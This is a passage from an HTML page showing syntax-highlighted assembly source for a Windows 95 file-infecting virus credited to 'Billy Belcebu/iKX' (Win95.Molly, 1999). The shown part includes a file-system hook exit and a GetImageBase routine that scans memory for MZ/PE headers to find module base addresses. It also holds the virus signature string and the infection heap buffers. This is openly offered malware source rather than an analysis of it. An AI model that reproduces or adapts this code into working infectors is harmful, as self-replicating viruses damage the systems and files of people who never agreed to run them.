        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitFileSystemHook</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ESI - Any position in the page where we want to search</span><span class="sc0">
</span><span class="sc1">;       ECX - Search limit (number of pages(limit)/10)</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX - Base address of module/process</span><span class="sc0">

</span><span class="sc5">GetImageBase</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">_@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CheckPE</span><span class="sc0">
</span><span class="sc5">_@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00010000h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">_@1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WeFailed</span><span class="sc0">
</span><span class="sc5">CheckPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esi.3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">_@2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">WeFailed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; --- Some shit</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"[Win95.Molly] (c) 1999 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; --- Virus heap data</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc0">               </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">pe_header</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">heap_end</span><span class="sc0">                </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">molly</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">virus</span><span class="sc0">




</span></div></body>
</html>
